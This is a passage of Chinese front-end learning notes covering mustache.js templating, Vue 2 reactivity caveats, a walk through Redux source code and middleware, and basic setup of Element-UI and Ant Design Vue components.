      { "name": "小明", "age": 12, "sex": "男" },
      { "name": "小红", "age": 11, "sex": "女" },
      { "name": "小强", "age": 13, "sex": "男" }
    ];
    var list = document.getElementById('list');
    // 遍历arr数组，每遍历一项，就以字符串的视角将HTML字符串添加到list中
    for (let i = 0; i < arr.length; i++) {
      list.innerHTML += `
                <li>
                    <div class="hd">${arr[i].name}的基本信息</div>    
                    <div class="bd">
                        <p>姓名：${arr[i].name}</p>    
                        <p>性别：${arr[i].sex}</p>    
                        <p>年龄：${arr[i].age}</p>    
                    </div>    
                </li>
            `;
    }
  </script>
</body>
</html>
```

效果：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220822.png" alt="image-20210209163245073" style="zoom:67%;" />

#### Mustache模板引擎

在Javascript中 mustache.js是实现mustache模板系统。

Mustache是一种没有逻辑的模板语法。它可以应用于HTML、配置文件、源代码等任何地方。 它通过使用散列或对象中提供的值在模板中展开标记来工作。

我们称它为没有逻辑的模板，是因为它没有if语句、else子句和for循环，它只有标签。一些标签被替换为值或什么也没有或者一系列的值。

不能在模板中使用else if做逻辑判断，我们可以在数据传入之前对数据做逻辑操作。

我们在那使用mustache.js

你可以在任何可以使用JavaScript的地方使用mustache.js来渲染mustache模板。包括web浏览器、服务器环境（node）。

语法

- 模板以包裹住内容，格式中写入的是模板的内容。 被替换的内容字段使用双花括号包裹起来"{{}}"
- 插值表达式：双花括号{{}} 包裹替换的字段
- {{#prop-name}}{{/prop-name}}用作for循环渲染，当prop-name的值为非空数组时，mustach不会遍历该数组，渲染出个数和该数组长度相等的DOM元素
- 也可以用作if-else判断。{{#prop-name}}{{/prop-name}}和{{^prop-name}}{{/prop-name}}两组标签结合使用，当prop-name的值存在且不为false时，会渲染{{#prop-name}}{{/prop-name}}的内容，否则渲染{{^prop-name}}{{/prop-name}}的内容。

##### 基本使用

**基本用法一（不循环）：**

```
     <!DOCTYPE html>
     <html lang="en">
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>Document</title>
     </head>
     <body>
         <div id="container"></div>
         <script src="https://cdn.bootcdn.net/ajax/libs/mustache.js/4.1.0/mustache.js"></script>
         <script>
             var templateStr = `
                 <h1>我买了一个{{thing}}，好{{mood}}啊</h1>
               `;
             var data = {
                 thing: '华为手机',
                 mood: '开心'
             };
             var domStr = Mustache.render(templateStr, data);
             var container = document.getElementById('container');
             container.innerHTML = domStr;
         </script>
     </body>
     </html>
```

效果：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220827.png" alt="image-20210209204414202" style="zoom:80%;" />

**基本用法二（循环对象数组）：**

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>
<body>
  <div id="container"></div>
  <!-- 模板 -->
  <script type="text/template" id="mytemplate">
        <ul>
            {{#arr}}
                <li>
                    <div class="hd">{{name}}的基本信息</div>    
                    <div class="bd">
                        <p>姓名：{{name}}</p>    
                        <p>性别：{{sex}}</p>    
                        <p>年龄：{{age}}</p>    
                    </div>
                </li>
            {{/arr}}
        </ul>
    </script>
  <script src="https://cdn.bootcdn.net/ajax/libs/mustache.js/4.1.0/mustache.js"></script>
  <script>
    var templateStr = document.getElementById('mytemplate').innerHTML;
    var data = {
      arr: [
        { "name": "小明", "age": 12, "sex": "男" },
        { "name": "小红", "age": 11, "sex": "女" },
        { "name": "小强", "age": 13, "sex": "男" }
      ]
    };
    var domStr = Mustache.render(templateStr, data);
    var container = document.getElementById('container');
    container.innerHTML = domStr;
  </script>
</body>

</html>
```

效果：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220830.png" alt="image-20210209204928002" style="zoom:80%;" />

注：<script>设置type="text/template"，标签里面的内容不会被执行，也不会显示在页面上，但是可以在另一个script里面通过获取插入到页面中。这样就把大段的HTML操作从js里面分离开了。处理type = "text/javascript"的<sctipt>标签都不会执行，但是可以通过DOM获取该标签，利用innerHTML获取其中的内容。

基本用法三（循环简单数组）：

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <div id="container"></div>
    <script src="https://cdn.bootcdn.net/ajax/libs/mustache.js/4.1.0/mustache.js"></script>
    <script>
        var templateStr = `
            <ul>
                {{#arr}}
                    <li>{{.}}</li>    
                {{/arr}}
            </ul>
        `;

        var data = {
            arr: ['A', 'B', 'C']
        };
        var domStr = Mustache.render(templateStr, data);
        var container = document.getElementById('container');
        container.innerHTML = domStr;
    </script>
</body>
</html>
```

效果：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220834.png" alt="image-20210209205455382"  />

注：我们注意到上面代码render的第二个参数都是一个对象，第二个参数我们通常都会使用对象类型，传入一个对象，在模板中书写对象属性，可以渲染出对象的值。 但也可以是其它类型如 数组、字符串类型、数字，如果第二个参数是其它类型，那么在模板中双花括号内就用点 `.` 来表示，使用起来不方便。 一般在项目中很少会传入其它类型。

基本用法四（数组的嵌套使用）：

实例：

```
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>
<body>
  <div id="container"></div>
  <script src="https://cdn.bootcdn.net/ajax/libs/mustache.js/4.1.0/mustache.js"></script>
  <script>
    var templateStr = `
            <ul>
                {{#arr}}
                    <li>
                        {{name}}的爱好是：
                        <ol>
                            {{#hobbies}} 
                                <li>{{.}}</li>
                            {{/hobbies}} 
                        </ol>
                    </li>    
                {{/arr}}
            </ul>
        `;
    var data = {
      arr: [
        { 'name': '小明', 'age': 12, 'hobbies': ['游泳', '羽毛球'] },
        { 'name': '小红', 'age': 11, 'hobbies': ['编程', '写作文', '看报纸'] },
        { 'name': '小强', 'age': 13, 'hobbies': ['打台球'] },
      ]
    };
    var domStr = Mustache.render(templateStr, data);
    var container = document.getElementById('container');
    container.innerHTML = domStr;
  </script>
</body>
</html>
```

效果：

![image-20210209205959811](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220838.png)



基本用法五（if-else):

```
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>
<body>
  <div id="container"></div>
  <script src="jslib/mustache.js"></script>
  <script>
    var templateStr = `
            {{#m}}
                <h1>你好</h1>
            {{/m}}
            {{^m}}
                <h1>好你</h1>
            {{/m}}
        `;
    var data = {
      m: false
    };
    var domStr = Mustache.render(templateStr, data);
    var container = document.getElementById('container');
    container.innerHTML = domStr;
  </script>
</body>
</html>
```

效果：

![image-20210209210057061](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220841.png)

注：也可以用作if-else判断。{{#prop-name}}{{/prop-name}}和{{^prop-name}}{{/prop-name}}两组标签结合使用，当prop-name的值存在且不为false时，会渲染{{#prop-name}}{{/prop-name}}的内容，否则渲染{{^prop-name}}{{/prop-name}}的内容。

##### 实现原理

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220844.png" alt="image-20210220040236062" style="zoom: 50%;" />![image-20210220040353683](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221502.png)

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220851.png" alt="image-20210220040458359" style="zoom:50%;" />![image-20210220040839272](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221508.png)

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220859.png" alt="image-20210220040458359" style="zoom:50%;" /><img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221514.png" alt="image-20210220040839272" />

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220906.png" alt="image-20210220040839272" style="zoom:50%;" />![image-20210220041605723](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221519.png)

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220913.png" alt="image-20210220041627991" style="zoom:50%;" />

### 响应式原理

> 现在是时候深入一下了！Vue 最独特的特性之一，是其非侵入性的响应式系统。数据模型仅仅是普通的 JavaScript 对象。而当你修改它们时，视图会进行更新。
>
> 这使得状态管理非常简单直接，不过理解其工作原理同样重要，这样你可以避开一些常见的问题。在这个章节，我们将研究一下 Vue 响应式系统的底层的细节。

#### 如何追踪变化

当你把一个普通的 JavaScript 对象传入 Vue 实例作为 `data` 选项，Vue 将遍历此对象所有的 property，并使用 [`Object.defineProperty`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty) 把这些 property 全部转为 [getter/setter](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Working_with_Objects#定义_getters_与_setters)。`Object.defineProperty` 是 ES5 中一个无法 shim 的特性，这也就是 Vue 不支持 IE8 以及更低版本浏览器的原因。

这些 getter/setter 对用户来说是不可见的，但是在内部它们让 Vue 能够追踪依赖，在 property 被访问和修改时通知变更。这里需要注意的是不同浏览器在控制台打印数据对象时对 getter/setter 的格式化并不同，所以建议安装 [vue-devtools](https://github.com/vuejs/vue-devtools) 来获取对检查数据更加友好的用户界面。

每个组件实例都对应一个 **watcher** 实例，它会在组件渲染的过程中把“接触”过的数据 property 记录为依赖。之后当依赖项的 setter 触发时，会通知 watcher，从而使它关联的组件重新渲染。



<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210405221131.png" alt="data" style="zoom:67%;" />

响应式具体实现原理：https://github.com/answershuto/learnVue/blob/master/docs/%E5%93%8D%E5%BA%94%E5%BC%8F%E5%8E%9F%E7%90%86.MarkDown

#### 检测变化的注意事项

由于 JavaScVue 无法检测 property 的添加或移除。由于 Vue 会在初始化实例时对 property 执行 getter/setter 转化，所以 property 必须在 `data` 对象上存在才能让 Vue 将它转换为响应式的。例如：ript 的限制，Vue **不能检测**数组和对象的变化。尽管如此我们还是有一些办法来回避这些限制并保证它们的响应性。

##### 对于对象

`Vue 无法检测 property 的添加或移除`。由于 Vue 会在初始化实例时对 property 执行 getter/setter 转化，所以 property 必须在 `data` 对象上存在才能让 Vue 将它转换为响应式的。例如：

```
     var vm = new Vue({
       data:{
         a:1,
         someObject:{c:1}
       }
     })

     // `vm.a` 是响应式的

     vm.b = 2
     // `vm.b` 是非响应式的
```

对于已经创建的实例，Vue 不允许动态添加根级别的响应式 property。但是，可以使用 `Vue.set(object, propertyName, value)` 方法向嵌套对象添加响应式 property。例如，对于：

```
	Vue.set(vm.someObject, 'b', 2)
```

`注意：上面的您还可以使用 vm.$set 实例方法，这也是全局 Vue.set 方法的别名`

`添加属性也是在原来已经在data定义好了的嵌套对象中添加，不能直接向data添加属性，我们需要实现就定义好，不能动态添加data根属性`

您还可以使用 `vm.$set` 实例方法，这也是全局 `Vue.set` 方法的别名：

```
	this.$set(this.someObject,'b',2)
```

有时你可能需要为已有对象赋值多个新 property，比如使用 `Object.assign()` 或 `_.extend()`。但是，这样添加到对象上的新 property 不会触发更新。在这种情况下，你应该用原对象与要混合进去的对象的 		property 一起创建一个新的对象。

```
     // 代替 `Object.assign(this.someObject, { a: 1, b: 2 })`
     this.someObject = Object.assign({}, this.someObject, { a: 1, b: 2 })
```

##### 对于数组

Vue 不能检测以下数组的变动：

1. 当你利用索引直接设置一个数组项时，例如：`vm.items[indexOfItem] = newValue`
2. 当你修改数组的长度时，例如：`vm.items.length = newLength`

举个例子：

```
     var vm = new Vue({
       data: {
         items: ['a', 'b', 'c']
       }
     })
     vm.items[1] = 'x' // 不是响应性的
     vm.items.length = 2 // 不是响应性的
```

为了解决第一类问题，以下两种方式都可以实现和 `vm.items[indexOfItem] = newValue` 相同的效果，同时也将在响应式系统内触发状态更新：

```
     // Vue.set
     Vue.set(vm.items, indexOfItem, newValue)
```

```
     // Array.prototype.splice
     vm.items.splice(indexOfItem, 1, newValue)
```

你也可以使用 [`vm.$set`](https://cn.vuejs.org/v2/api/#vm-set) 实例方法，该方法是全局方法 `Vue.set` 的一个别名：

```
	vm.$set(vm.items, indexOfItem, newValue)
```

为了解决第二类问题，你可以使用 `splice`：

```
	vm.items.splice(newLength)
```

#### 声明响应式property

由于 Vue 不允许动态添加根级响应式 property，所以你必须在初始化实例前声明所有根级响应式 property，哪怕只是一个空值：

```
     var vm = new Vue({
       data: {
         // 声明 message 为一个空值字符串
         message: ''
       },
       template: '<div>{{ message }}</div>'
     })
     // 之后设置 `message`
     vm.message = 'Hello!'
```

如果你未在 `data` 选项中声明 `message`，Vue 将警告你渲染函数正在试图访问不存在的 property。

这样的限制在背后是有其技术原因的，它消除了在依赖项跟踪系统中的一类边界情况，也使 Vue 实例能更好地配合类型检查系统工作。但与此同时在代码可维护性方面也有一点重要的考虑：`data` 对象就像组件状态的结构 (schema)。提前声明所有的响应式 property，可以让组件代码在未来修改或给其他开发人员阅读时更易于理解。

#### 异步更新队列

当我们修改data里面的某些数据，我们页面对应的视图会响应式改变，但是这DOM更新并不是同步的，而是异步的，例子：



<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210405231436.png" alt="image-20210405231435499" style="zoom:80%;" />

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210405231516.png" alt="image-20210405231515902" style="zoom:80%;" />

为了在数据变化之后等待 Vue 完成更新 DOM，可以在数据变化之后立即使用 `Vue.nextTick(callback)`。这样回调函数将在 DOM 更新完成后被调用。例如：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210405231655.png" alt="image-20210405231655204" style="zoom:80%;" />

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210405231752.png" alt="image-20210405231751805" style="zoom:80%;" />

因为 `$nextTick()` 返回一个 `Promise` 对象，所以你可以使用新的 [ES2017 async/await](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/async_function) 语法完成相同的事情：

```
     methods: {
       updateMessage: async function () {
         this.message = '已更新'
         console.log(this.$el.textContent) // => '未更新'
         await this.$nextTick()
         console.log(this.$el.textContent) // => '已更新'
       }
     }
```

该章资料参考来源于：https://cn.vuejs.org/v2/guide/reactivity.html

# Redux

## 阅读源码的好处

> 在平时的开发中，99%以上的场景只是与框架或者组件暴露的API打交道，很少会涉及源码方面的要求。
>
> 那么我们为什么要阅读源码呢？
>
> 我认为阅读源码有以下这几点好处：
>
> 1、框架与组件都是顶级的行业人士打造出来的，他们所写的代码必然是高质量、高阅读性、规范性好的代码，
>
> ​	 我们在阅读源码的过程中可以学习其编程思想以及规范。
>
> 2、源码中使用的代码可能与我们平时开发的项目所使用的代码有较大区别，因为一个面向客户，一个面向开发人员，
>
> ​	 所以我们可以在阅读源码的过程中学习其设计思想以及查漏补缺自身的JS知识盲点。
>
> 3、提升自己改造框架和组件的能力，因为框架和组件是面向所有开发者的，但是并不一定完全适合自己
>
> 4、提高自己对框架和组件的理解，如果都阅读到了其底层，很多意想不到的bug就能游刃有余地解决了。

## 简介

> Redux 是 JavaScript 状态容器，提供可预测化的状态管理。 (如果你需要一个 WordPress 框架，请查看 [Redux Framework](https://reduxframework.com/)。)
>
> 可以让你构建一致化的应用，运行于不同的环境（客户端、服务器、原生应用），并且易于测试。不仅于此，它还提供 超爽的开发体验，比如有一个[时间旅行调试器可以编辑后实时预览](https://github.com/gaearon/redux-devtools)。
>
> Redux 除了和 [React](https://facebook.github.io/react/) 一起用外，还支持其它界面库。 它体小精悍（只有2kB，包括依赖）

![img](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505231446.jpeg)

## 基本使用

```
const { createStore } = require('redux')

const initialState = {
  cash: 200,
}
//reducer
const reducer = (state = initialState, action) => {
  const { type, payload } = action;
  switch (type) {
    case 'INCREMENT':
      return Object.assign({}, state, {
        cash: state.cash + payload
      });
    case 'DECREMENT':
      return Object.assign({}, state, {
        cash: state.cash - payload
      });
    default:
      return state;
  }
}

const store = createStore(reducer);
//订阅消息，如果数据发生更改则触发回调函数
store.subscribe(() => {
   console.log("数据更新");
});

//触发action
store.dispatch({
  type: 'INCREMENT',
  payload: 300
});
```

## createStore

以上是Redux的最基本使用，上面导入了redux的createStore方法，那么，下面我将从这个方法作为入口进行源码分析：

![image-20210504031606642](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505222936.png)

上图是createStore方法的源码，其中标注出来的是理解上面基本用法的关键，

createStore方法接收三个参数，第一个参数reducer就是我们所构造的reducer函数，第二个参数preloadedState是reducer state的初始值，

如果reducer中的state本来就已经有初始值，那么将会被preloadedState覆盖，第三个参数enhancer的作用暂不清楚

![image-20210504033440094](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505222936.png)

createStore方法前面的if语句主要是实现函数的重载，或者对参数类型的一些限制，由于上面的使用只使用到一个参数，所以这些代码并不

影响我们上面例子的实现

接下来就是以下代码，这些代码定义和初始化了一些变量

```
     let currentState = preloadedState //从函数createStore第二个参数preloadedState获得
     let currentReducer = reducer  //从函数createStore第一个参数reducer获得
     let currentListeners = [] //当前订阅者列表
     let nextListeners = currentListeners //新的订阅者列表
     let isDispatching = false
```

## getState

接下来我们先看getState方法，

```
       function getState() {
         if (isDispatching) {
           throw new Error(
             'You may not call store.getState() while the reducer is executing. ' +
               'The reducer has already received the state as an argument. ' +
               'Pass it down from the top reducer instead of reading it from the store.'
           )
         }
         return currentState
       }
```

我们测试输出以下getState（），发现其输出的是reducer的state,但是getState()返回的不是currentState吗？而currentState是由preloadedState

赋值的，应该为undefined的，但是为什么会输出{cash:200}呢？

```
const { createStore } = require('redux')
const initialState = {
  cash: 200,
}
//reducer
const reducer = (state = initialState, action) => {
  const { type, payload } = action;
  switch (type) {
    case 'INCREMENT':
      return Object.assign({}, state, {
        cash: state.cash + payload
      });
    case 'DECREMENT':
      return Object.assign({}, state, {
        cash: state.cash - payload
      });
    default:
      return state;
  }
}
const store = createStore(reducer);
console.log(store.getState());  //{cash:200}
```

我们接着往下看

在代码的下面，发现了这句代码，这句代码应该就是初始化currentState的了，ActionTypes.INIT是一个随机字符串，接下来再去看dispatch方法

源码

![image-20210504034555924](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505222936.png)

## dispatch

果然，在dispatch方法中找到了currentState初始化的代码，而getState方法返回的就是currentState，这就解释了为什么getState返回的是

{cash:200}了

![image-20210504035203446](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505222936.png)

dispatch方法的作用是更新currentState，并且触发订阅的回调函数，但是dispatch中的nextListeners和currentListeners是什么呢？

![image-20210504040433011](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505222936.png)

从上面的变量定义看，应该都为[]空数组，这两个储存的应该是订阅的回调函数，下面我们来看下subscribe方法是如何更新这两个变量的

![image-20210504113741367](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505222936.png)

![image-20210504113841610](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210504113841.png)

ensureCanMutateNextListeners方法的作用是判断nextListeners === currentListeners是否成立，成立的话就浅拷贝currentListeners

给nextListeners，然后nextListeners  push listener，这样的话就成功注册了订阅回调函数

最后返回的是取消订阅函数，我们可以在调用完订阅函数的同时取消订阅

接下来我们看下面的replaceReducer方法

![image-20210504120215595](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210504120215.png)

这个方法的作用很容易可以看出就是把新传入的reducer替换旧的reducer重新初始化

现在回到creatStore的第三个参数enhancer，这个参数中文翻译为增强器，顾名思义就是来增强redux的，它的类型的是Function，

createStore.js里有这么一段代码：

```
 if (typeof enhancer !== 'undefined') {
    if (typeof enhancer !== 'function') {
      throw new Error('Expected the enhancer to be a function.')
    }

    return enhancer(createStore)(reducer, preloadedState)
  }
```

这行代码展示了enhancer的调用过程，根据这个调用过程我们可以推导出enhancer的函数体的架子应该是这样子的:

```
 function enhancer(createStore) {
    return (reducer,preloadedState) => {
         //逻辑代码
        .......
    }
 }
```

## redux-thunk

常见的enhancer就是redux-thunk以及redux-saga，一般都会配合applyMiddleware一起使用，而applyMiddleware的作用就是将这些enhancer格式化成符合redux要求的enhancer。具体applyMiddleware实现，下面我们将会讲到。上面并没有讲到异步触发action的方式，下面我们用redux-thunk实现异步api的处理

```
const  { createStore, applyMiddleware } = require('redux');
// 导入redux-thunk异步插件
const thunk = require('redux-thunk');
const initialState = {
  cash: 200,
}
//reducer
const reducer = (state = initialState, action) => {
  const { type, data } = action;
  switch (type) {
    case 'INCREMENT':
      return Object.assign({}, state, {
        cash: state.cash + data
      });
    case 'DECREMENT':
      return Object.assign({}, state, {
        cash: state.cash - data
      });
    default:
      return state;
  }
}

// createStore作用: 创建一个仓储对象
const store = createStore(reducer, applyMiddleware(thunk));
console.log(store.getState());     //200
//订阅消息，如果数据发生更改则触发回调函数
store.subscribe(() => {
  console.log("数据更新");
});
let syncAction = function (data) {
  return {
    type: 'INCREMENT',
    data
  }
}
let asyncAction = function (data) {
  return function (dispatch) {
    setTimeout(() => {
      dispatch(syncAction(200))
      console.log(store.getState());  //500
    }, 3000)
  }
}
//触发同步action
store.dispatch(syncAction(100));
console.log(store.getState());  //300
//触发异步action
store.dispatch(asyncAction(100));
```

我们通过redux-thunk组件，实现了异步action的触发，实际上原理也是非常简单的，就是判断action是什么类型，

如果是对象类型则直接dispatch,如果是function类型，则执行它，这样就能实现其异步action触发了

![image-20210504223259284](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210504223259.png)

![image-20210504223507962](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210504223508.png)

## applyMiddleware

中间件，`express`与`koa`也就中间件，**`express`中的中间件处理的请求到响应的这一过程**，`redux`中的中间件处理的是从`action`发出到`reducer`接收到`action`这一过程，在这个过程中可以利用中间件进行写日志，处理异步操作等过程，作用就是来增强`createStore`，给其添加更多的功能。

## combineReducers

用来合并多个reducer

```
const { createStore, combineReducers} = require('redux')
const initialState = {
  cash: 200,
}
//reducer
const reducer1 = (state = initialState, action) => {
  const { type, payload } = action;
  switch (type) {
    case 'INCREMENT':
      return Object.assign({}, state, {
        cash: state.cash + payload
      });
    case 'DECREMENT':
      return Object.assign({}, state, {
        cash: state.cash - payload
      });
    default:
      return state;
  }
}
const reducer2 = (state = [], action) => {
  const { type, payload } = action;
  switch (type) {
    case 'INCREMENT1':
      return  [...state].push(1)
    case 'DECREMENT2':
      return Object.assign({}, state, {
        cash: state.cash - payload
      });
    default:
      return state;
  }
}
const reducers = combineReducers({ reducer1, reducer2 });
const store = createStore(reducers);
console.log(store.getState());
store.subscribe(() => {
  console.log(store.getState());
});

store.dispatch({
  type: 'INCREMENT1',
  payload: 300
});
```

# 	Element-UI

## Element-UI的基本使用

Element-UI：一套为开发者、设计者和产品经理准备的基于Vue2.0的桌面端组件库。

官网地址为：https://element.eleme.cn/2.0/

**1、基于命令行方式手动安装**

1. 安装依赖包 npm i element-ui -S

2. 导入 Element-UI相关资源（不推荐使用）

   ```
   //导入组件库
   import ElementUI from 'element-ui';
   //导入组件相关样式
   import 'element-ui/lib/theme-chalk/index.css';
   //配置Vue插件
   Vue.use(ElementUI);
   ```

**2、命令行按需安装**(推荐使用，系统会自动配置)

​	1、在 命令行输入 vue add element

​	2、How do you want to import Element?选择 Import on demand （关键）按需引入❯ Fully import 全局引入Choose the locale you want to load

​	3、选择 zh-CN

​	4、npm run server

**3、引入组件**

​	访问Element-UI官网

​	找到需要的组件，复制对应的代码

​	<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220918.png" alt="image-20201015170514261" style="zoom:80%;" />

![image-20201015170609887](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220921.png)

把组件代码粘贴在你需要的页面中

效果：

![image-20201015170649633](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220925.png)

## 	自由使用element标签

配置好elementui后，可以在所有模板中使用element标签

例如：

​	<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220928.png" alt="image-20201017115201718" style="zoom: 80%;" />

![image-20201017115225148](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220932.png)

样式可以使用点+标签的形式控制样式

# Ant Design of Vue

## 简介

> 这里是 Ant Design 的 Vue 实现，开发和服务于企业级后台产品。

## 安装

```
 npm i --save ant-design-vue
```

在main.js中引入：

```
import Antd from 'ant-design-vue';
import 'ant-design-vue/dist/antd.css';
Vue.use(Antd);
```

这样就可以在vue项目中任何地方使用了

## 基本使用

```
<template>
  <div id="app">
    <a-button>测试</a-button>//antD按钮组件
  </div>
</template>
<script>
export default {
  name: 'App',
}
</script>
<style>
</style>
```

效果：

![image-20201029214137085](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220937.png)



可以看出，已经成功使用了

## 布局Layout

### Layout布局

1. a-layout

   > 布局容器，其下可嵌套 `Header` `Sider` `Content` `Footer` 或 `Layout` 本身，可以放在任何父容器中。

2. a-layout-header

   > 顶部布局，自带默认样式，其下可嵌套任何元素，只能放在 `Layout` 中。

   垂直布局

3. a-layout-content

   > 内容部分，自带默认样式，其下可嵌套任何元素，只能放在 `Layout` 中。

   垂直布局或水平布局

4. a-layout-sider

   > 侧边栏，自带默认样式及基本功能，其下可嵌套任何元素，只能放在 `Layout` 中。

   水平布局

5. a-layout-footer

   > 底部布局，自带默认样式，其下可嵌套任何元素，只能放在 `Layout` 中。

   垂直布局

### Grid栅格

> 在多数业务情况下，Ant Design Vue 需要在设计区域内解决大量信息收纳的问题，因此在 12 栅格系统的基础上，我们将整个设计建议区域按照 24 等分的原则进行划分。
> 划分之后的信息区块我们称之为『盒子』。建议横向排列的盒子数量最多四个，最少一个。『盒子』在整个屏幕上占比见上图。设计部分基于盒子的单位定制盒子内部的排版规则，以保证视觉层面的舒适感。

**概述**

布局的栅格化系统，我们是基于行（row）和列（col）来定义信息区块的外部框架，以保证页面的每个区域能够稳健地排布起来。下面简单介绍一下它的工作原		理：

- 通过`row`在水平方向建立一组`column`（简写col）

- 你的内容应当放置于`col`内，并且，只有`col`可以作为`row`的直接元素

- 栅格系统中的列是指 1 到 24 的值来表示其跨越的范围。例如，三个等宽的列可以使用 `<a-col :span="8" />` 来创建

- `如果一个row中的col总和超过 24，那么多余的col会作为一个整体另起一行排列`

  **Flex 布局**

  我们的栅格化系统支持 Flex 布局，允许子元素在父节点内的水平对齐方式 - 居左、居中、居右、等宽排列、分散排列。子元素与子元素之间，支持顶部对齐、垂直居中对齐、底部对齐的方式。同时，支持使用 order 来定义元素的排列顺序。
  Flex 布局是基于 24 栅格来定义每一个『盒子』的宽度，但不拘泥于栅格。

**通过getter我们可以控制元素的水平和垂直间隔**

例如：

```
 <a-row :gutter="[10, 60]" type="flex">
      <a-col :span="1">
        <div>Column</div>
      </a-col>
      <a-col :span="1">
        <div>Column</div>
      </a-col>
    </a-row>
    <a-row :gutter="[10, 60]" type="flex">
      <a-col :span="1">
        <div>Column</div>
      </a-col>
      <a-col :span="1">
        <div>Column</div>
      </a-col>
    </a-row>
```

如果getter属性只有一个数字，那么就代表水平方向的间距，单位是px,如果是一个数据，那么就一次控制水平方向和垂直方向的

**使用 `offset` 可以将列向右侧偏。例如，`:offset="4"` 将元素向右侧偏移了 4 个列（column）的宽度。**

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220940.png" alt="image-20201103093817381" style="zoom:80%;" />

```
<template>
  <a-row>
    <a-col :span="8">
      col-8
    </a-col>
    <a-col :span="8" :offset="8">
      col-8
    </a-col>
  </a-row>
  <a-row>
    <a-col :span="6" :offset="6">
      col-6 col-offset-6
    </a-col>
    <a-col :span="6" :offset="6">
      col-6 col-offset-6
    </a-col>
  </a-row>
  <a-row>
    <a-col :span="12" :offset="6">
      col-12 col-offset-6
    </a-col>
  </a-row>
</template>
```

### Space间距

> 设置组件之间的间距。

基本使用

> 通过size属性可以控制组件之间的间距，size可以使用small | middle | large | number,前三个都是默认设定好的，number的单位是px

```
<template>
  <div>
    <a-space size="middle">
      <a-button type="primary">Primary</a-button>
      <a-button>Default</a-button>
      <a-button type="dashed">Dashed</a-button>
      <a-button type="link">Link</a-button>
    </a-space>
  </div>
</template>
<script>
export default {
};
</script>
```



## 数据输入（Data Entry)

### Form表单

> 表单是用来数据采集的容器，也可以视为一个对象。
>
> 表单包含三个部分：表单标签， 表单域， 表单按钮。
>
> 具有数据收集、校验和提交功能的表单，包含复选框、单选框、输入框、下拉选择框等元素。

#### 基本使用

基本结构是：

```
<a-form-model>
    <a-form-model-item label="Activity name">
      <a-input/>
    </a-form-model-item>
    <a-form-model-item">
      <a-button type="primary" @click="onSubmit">
        Create
      </a-button>
    </a-form-model-item>
  </a-form-model>
```

实际案例：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220953.png" alt="image-20201102204613464" style="zoom:80%;" />

```
<template>
  <a-form-model :label-col="labelCol" :wrapper-col="wrapperCol">
    <a-form-model-item label="Activity name">
      <a-input v-model="form.name" />
    </a-form-model-item>
    <a-form-model-item label="Activity zone">
      <a-select v-model="form.region" placeholder="please select your zone">
        <a-select-option value="shanghai">
          Zone one
        </a-select-option>
        <a-select-option value="beijing">
          Zone two
        </a-select-option>
      </a-select>
    </a-form-model-item>
    <a-form-model-item :wrapper-col="{ span: 14, offset: 4 }">
      <a-button type="primary" @click="onSubmit">
        Create
      </a-button>
      <a-button style="margin-left: 10px;">
        Cancel
      </a-button>
    </a-form-model-item>
  </a-form-model>
</template>
<script>
export default {
  data() {
    return {
      labelCol: { span: 4 },
      wrapperCol: { span: 14 },
      form: {
        name: '',
      },
    }
  },
  methods: {
    onSubmit() {
      console.log('submit!', this.form)
    },
  },
}
</script>
```

点击按钮输出：

